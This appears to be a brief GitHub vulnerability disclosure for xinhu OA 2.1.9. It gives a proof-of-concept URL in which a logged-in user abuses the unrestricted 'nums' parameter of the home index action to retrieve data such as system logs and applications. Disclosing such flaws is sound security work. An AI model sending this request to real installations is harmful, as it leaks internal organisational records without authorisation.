# xinhu-oa
xinhu oa Information leakage
xinhu V2.1.9
After the user logged in, open the following  page
poc：
/index.php?a=gettotal&m=index&d=home&atype=&loadci=&optdt=&nums=gong,kqdk,apply,officic,syslog,about&ajaxbool=true

Display the information in the picture
![image](https://github.com/xuechengen/xinhu-oa/blob/main/%E6%98%BE%E7%A4%BA.JPG)

Check the source code and find that nums is not restricted，/webmain/home/index/indexAction.php
![image](https://github.com/xuechengen/xinhu-oa/blob/main/2.JPG) 

 Change ajaxbool = false to ajaxbool = true
